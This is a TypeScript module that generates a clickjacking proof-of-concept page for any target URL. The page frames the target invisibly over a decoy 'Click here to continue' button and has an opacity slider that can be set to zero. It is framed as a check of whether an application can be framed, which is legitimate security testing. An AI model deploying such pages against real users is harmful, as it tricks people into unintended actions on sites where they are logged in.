export type ClickjackInput = {
  url: string;
  title?: string;
};

export type ClickjackPoc = {
  html: string;
  notes: string[];
};

function attr(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export function buildClickjackPoc(input: ClickjackInput): ClickjackPoc {
  const url = input.url.trim();
  if (!url) {
    throw new Error("a target URL is required");
  }
  const title = input.title?.trim() || "Clickjacking PoC";
  const notes = [
    "This is a local HTML proof of concept. Review it before opening it in a browser.",
    "If the target sets X-Frame-Options or a CSP frame-ancestors policy, the iframe will stay blank.",
  ];
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${attr(title)}</title>
  <style>
    body { font-family: sans-serif; margin: 1.5rem; }
    .stage { position: relative; width: min(960px, 90vw); height: 70vh; border: 1px solid #ccc; }
    .bait { position: absolute; left: 40%; top: 40%; z-index: 1; pointer-events: none; padding: 0.6rem 1rem; background: #c00; color: #fff; border: 0; font-size: 1rem; }
    iframe { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; z-index: 2; }
    label { display: block; margin: 0.75rem 0; }
  </style>
</head>
<body>
  <h1>${attr(title)}</h1>
  <p>This page iframes <code>${attr(url)}</code> so you can see whether the application is frameable. The decoy button is underneath the iframe. Opacity starts at 50% so you can line things up; drop it to 0 for a realistic test. Review before opening.</p>
  <label>Opacity <input id="opacity" type="range" min="0" max="100" value="50" /> <span id="value">50%</span></label>
  <div class="stage">
    <button class="bait" type="button">Click here to continue</button>
    <iframe id="frame" src="${attr(url)}"></iframe>
  </div>
  <script>
    const frame = document.getElementById("frame");
    const slider = document.getElementById("opacity");
    const value = document.getElementById("value");
    const apply = () => {
      const next = Number(slider.value) / 100;
      frame.style.opacity = String(next);
      value.textContent = Math.round(next * 100) + "%";
    };
    slider.addEventListener("input", apply);
    apply();
  </script>
</body>
</html>
`;
  return { html, notes };
}
